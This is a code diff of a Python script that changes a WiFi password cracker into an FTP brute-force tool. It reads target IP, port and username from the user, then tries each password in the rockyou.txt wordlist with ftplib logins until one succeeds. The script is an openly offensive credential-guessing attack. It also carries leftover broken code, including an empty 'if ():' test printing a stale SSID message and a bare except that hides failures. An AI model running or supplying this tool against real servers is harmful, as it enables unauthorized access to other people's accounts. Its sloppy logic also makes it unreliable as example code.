@@ -1,23 +1,38 @@
 import time
-from wireless import Wireless
+import ftplib
 
-target_SSID = input("enter the target SSID: ")
+IP_ADDR = input("enter the target ip address: ")
+PORT_NUM = input("enter port number: ")
+username = input("enter target username: ")
 file_path = "./rockyou.txt"
 time_start = time.time() 		#start clock
-wireless = Wireless()
+server = ftplib.FTP()
+server.connect(IP_ADDR,int(PORT_NUM))
+doc_len = len(open(file_path, "r", errors='replace').readlines())
+num_attempts = 0
 with open(file_path, "r", errors='replace') as f:
-	doc_len = len(f.readlines())
 	for _ in range(doc_len):
+		num_attempts += 1
+		print(num_attempts)
 		#========pull passwords from file line by line======
 		potential_password = f.readline()
 		#========strip passwords of new line char===========
 		potential_password = potential_password.rstrip('\n')
-		#========ATTEMPT WIFI LOGIN HERE====================
-		wireless.connect(ssid=target_SSID, password=potential_password)
-		if (wireless.connect(ssid=target_SSID, password=potential_password) == True):
-			print('password for SSID "' + target_SSID + '" is ' + potential_password)
+		#========ATTEMPT FTP LOGIN HERE====================
+		try:
+			server.login(username,potential_password)
+			check_login = server.voidcmd("NOOP")	#send NOOP cmd and wait for 2xx response
+			check_login = check_login[0] #get first char of response
+			if(check_login == '2'):
+				print(potential_password)
+				break
+			# else:
+			# 	server.connect(IP_ADDR)
+		except:
+			pass
+		if ():
+			print('password for SSID "' + IP_ADDR + '" is ' + potential_password)
 			print(potential_password)
-			break
 #time.sleep(300)
 time_stop = time.time()			#end clock
 time_check = time_stop - time_start
